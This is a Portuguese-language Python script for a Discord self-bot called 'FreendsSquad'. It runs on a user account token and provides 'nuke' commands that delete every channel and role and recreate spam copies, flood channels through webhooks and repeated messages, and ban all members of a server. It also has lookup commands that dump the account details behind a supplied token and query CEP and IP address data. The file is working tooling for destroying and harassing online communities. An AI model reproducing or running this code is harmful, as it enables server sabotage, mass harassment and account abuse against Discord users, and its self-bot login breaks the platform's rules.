import os, json
from time import sleep
clear = lambda: os.system("clear")

libs = ("python-discord", "requests", "colorama", "pyfiglet")

try:
	import discord, requests, pyfiglet
	from discord.ext import commands
	from colorama import Fore, init
except:
	print("Instalando Bibliotecas, Aguarde!")
	sleep(1)
	for lib in libs:
		os.system(f"pip install {lib}")
		
	import discord, requests, pyfiglet
	from discord.ext import commands
	from colorama import Fore, init
	
init(autoreset=True)
	
vemelho = Fore.RED
verde = Fore.GREEN
ciano = Fore.CYAN
roxo = Fore.MAGENTA
branco = Fore.WHITE
reset = Fore.RESET

add1 = reset + f"[{verde}+{reset}]"
add2 = reset + f"[{ciano}+{reset}]"
add3 = reset + f"[{roxo}+{reset}]"
a1 = reset + f"[{verde}!{reset}]"
a2 = reset + f"[{ciano}!{reset}]"
a3 = reset + f"[{roxo}!{reset}]"
m1 = reset + f"[{vemelho}-{reset}]"
pergunta1 = reset + f"[{ciano}?{reset}]"
pergunta2 = reset + f"[{vemelho}?{reset}]"
	
def banner(nome="banner", x=15):
	return pyfiglet.figlet_format(nome.center(x))
	
print(roxo + banner("FreendsSquad", 30) + reset)

token = input(f"{add2} {vemelho}Token: {branco}")
prefixo = input(f"{add2} {vemelho}Prefixo: {branco}")
logs = input(f"{pergunta1} {vemelho}Logs (s/n): {branco}").strip().lower()[0]

if not logs in "syn":
	print(f"{pergunta2}{vemelho} Não Entendi! O Logs Vai ser {branco}Sim{reset}!")
	logs = "s"
	
print(f"\n{a3} {roxo}Conectando...{reset}")

intents = discord.Intents.all()

riyx = commands.Bot(command_prefix=prefixo, intents=intents, self_bot=True)

@riyx.event
async def on_ready():
	clear()
	
	print(roxo + banner("FreendsSquad", 30) + reset)
	
	print(f"{add1} {vemelho}Conectado Em: {branco}{riyx.user}")
	print(f"{add1} {vemelho}Comando de Ajuda: {branco}{prefixo}ajuda")
	print(f"{add1} {vemelho}Versão: {branco}V1")
	
	if logs in "sy":
		print(f"{add1} {vemelho}Logs: {branco}Ativado!\n")
	else:
		print(f"{add1} {vemelho}Logs: {vermelho}Desativado!{reset}\n")
		
@riyx.command(name="ajuda")
async def ajuda(ctx):
	await ctx.message.delete()
	texto = f"""
**__============================__**

**__FREENDS SQUAD__**

**__Organização: Freends Squad**

=============================

**__NUKE__**: 
```
	{prefixo}nc < número > < nome >: Nuke de Canais
	
	{prefixo}ng < número > < nome >: Nuke de Cargos
	
	{prefixo}raid: RAID SERVIDOR
	
	{prefixo}nrc < número > < mensagem >: Vai mandar o total de vezes as mensagens que você escolher
	
	{prefixo}banall: Bane Todos os Membros```
	
**__CONSULTA__**:
```
	{prefixo}infotoken < token >: Informações do Token
	{prefixo}infocep < cep >: Informações do CEP
	{prefixo}infoip < ip >: Informações do IP
```
	"""
	await ctx.send(texto)
	
	if logs in "sy":
		
		print(f"{add3} {vemelho}Comando Ajuda!{reset}")
		
@riyx.command(name="nc")
async def nc(ctx, n=20, *m):
	await ctx.message.delete()
	m = "Freends Squad".join(m)
	
	if not m:
		m = "FreendsSquad"
		
	if logs in "sy":
		print(f"{add3} {vemelho}Comando 01!{reset}")
		
	for canal in ctx.guild.channels:
		try:
			await canal.delete()
			if logs in "sy":
				print(f"{m1} {roxo}Deletando o Canal: {vemelho}{canal}{reset}")
		except:
			if logs in "sy":
				print(f"{m1} {vemelho}Erro ao Deletar o Canal: {vemelho}{canal}{reset}")
			
	for canais in range(1, int(n)+1):
		try:
			await ctx.guild.create_text_channel(m)
			if logs in "sy":
				print(f"{add1} {vemelho}Criei {branco}{canais}{vemelho} Canais!{reset}")
		except:
			if logs in "sy":
				print(f"{m1} Error! Verifique se você tem Permissão Para Deletar Canais!")
			
	if logs in "sy":
		print(f"{add3} {verde}Ataque Finalizado!{reset}")
		
		
@riyx.command(name="ng")
async def ng(ctx, n=20, *m):
	
	if logs in "sy":
		print(f"{add3} {vemelho}Comando 02{reset}")
	await ctx.message.delete()
	
	m = " ".join(m)
	
	if not m:
		m = "FreendsSquad"
		
	for cargo in ctx.guild.roles:
		try:
			await cargo.delete()
			if logs in "sy":
				print(f"{m1} {vemelho}Deletei o Cargo: {vermelho}{cargo}{reset}")
		except:
			if logs in "sy":
				print(f"{m1} {roxo}Erro ao Deletar o Cargo: {vemelho}{cargo}{reset}")
			
	for cargos in range(1, int(n)+1):
		try:
			await ctx.guild.create_role(name=m)
			if logs in "sy":
				print(f"{add1} {vemelho}Criei {branco}{cargos} {roxo}Cargos!{reset}")
		except:
			if logs in "sy":
				print(f"{m1} Error! Verifique se você tem Permissão Para Criar Cargos!")
		
	if logs in "sy":
		print(f"{add3}{verde}Ataque Finalizado!{reset}")
		
@riyx.command(name="raid")
async def raid(ctx):
	await ctx.message.delete()
		
	if logs in "sy":
		print(f"{add3} {vemelho}Comando WebNuker!{reset}")
		
	arqv = open("webnuker.json")
	dict = json.load(arqv)
	
	for canal in ctx.guild.channels:
		for x in range(dict["total"]):
			try:
				webhook = await ctx.channel.create_webhook(name=dict["nome"])
			
				await webhook.send(dict["mensagem"])
				
				if logs in "sy":
					print(f"{add1}{verde} Chat {vemelho}{canal}{verde} Raidado!{reset}")
					
			except:
				if logs in "sy":
					print(f"{m1}{roxo} Erro ao Raidar o Chat {branco}{canal}{roxo}!{reset}")
					continue
		
@riyx.command(name="nrc")
async def nrc(ctx, n=5, *m):
	
	await ctx.message.delete()
	
	m = " ".join(m)
	
	if logs in "sy":
		print(f"{add3}{vemelho} Comando Chats!{reset}")
	
	if not m:
		m = "Freends Squad"
		
	for canal in ctx.guild.channels:
		try:
			for x in range(int(n)):
				await canal.send(m)
			if logs in "sy":
				print(f"{add1}{branco} Chat {vemelho}{canal}{branco} Raidado!{reset}")
		except:
			if logs in "sy":
				print(f"{m1}{roxo} Erro ao Spamar no Chat {vemelho}{canal}{roxo}!{reset}")
		
@riyx.command(name="banall")
async def banall(ctx):
	
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {vemelho}Comando BanAll{reset}")
		
	for membros, membro in enumerate(ctx.guild.members):
		try:
			await membro.ban()
			if logs in "sy":
				print(f"{m1} {vemelho}Membro Banido: {branco}{membro}")
		except:
				if logs in "sy":
					print(f"{m1} {roxo}Error ao Banir o Usuário: {branco}{membro}!{reset}")
					
	if logs in "sy":
		print(f"{add1} {vemelho}Eu bani {branco}{membros}{vemelho} Membros!{reset}")
				
@riyx.command(name="infotoken")
async def infotoken(ctx, token):
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {vemelho}Comando TokenInfo!{reset}")
	
	req = requests.get("https://discord.com/api/v6/users/@me", headers={"Authorization": token}).json()
	infos = []
	
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos.append(f"[Token] {token}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
	
@riyx.command(name="infocep")
async def infocep(ctx, cep):
	
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {vemelho}Comando CEPInfo!{reset}")
	
	cep = cep.replace("+", ""); cep = cep.replace("-", ""); cep = cep.replace(".", "")
	
	req = requests.get(f"https://viacep.com.br/ws/{cep}/json/").json()
	infos = []
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
	
@riyx.command(name="infoip")
async def infoip(ctx, ip):
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {vemelho}Comando IPInfo!{reset}")
	
	req = requests.get(f"http://ip-api.com/json/{ip}").json()
	infos = []
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
				
try:
	riyx.run(token, bot=False)
except Exception as Error:
	clear()
	print(f"{a3} {roxo} Error Detectado: {branco}{Error}")
